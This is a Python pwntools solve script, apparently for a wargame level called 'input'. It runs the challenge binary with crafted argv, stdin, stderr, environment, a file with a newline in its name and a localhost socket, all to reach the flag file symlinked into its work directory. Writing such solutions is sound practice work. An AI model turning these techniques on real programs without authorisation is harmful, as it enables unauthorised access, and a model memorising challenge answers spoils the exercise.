#!/usr/bin/python
import os
from pwn import *

# Prerequisite: Symlink /home/input2/flag to /tmp/snix0/flag

context.log_level="debug"

WORKDIR="/tmp/snix0"

if not os.path.exists(WORKDIR):
    os.mkdir(WORKDIR)

with open(os.path.join(WORKDIR, "err"), "wb") as fdErr,open(os.path.join(WORKDIR,"\x0a"), "wb") as fdStg4:
    fdErr.write(b'\x00\x0a\x02\xff')
    fdStg4.write(b'\x00\x00\x00\x00')

arglist = []

for i in range(100):
    if i == ord('A'):
        arglist.append('\x00')
    elif i == ord('B'):
        arglist.append('\x20\x0a\x0d')
    elif i == ord('C'):
        arglist.append('1339')
    else:
        arglist.append('A')

fdErr = open(os.path.join(WORKDIR, "err"))

environment = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}

p = process(cwd="/tmp/snix0", executable="/home/input2/input", argv=arglist, stderr=fdErr, env=environment)

p.sendline("\x00\x0a\x00\xff")

conn = remote('localhost', 1339)
conn.sendline('\xde\xad\xbe\xef')

p.interactive()
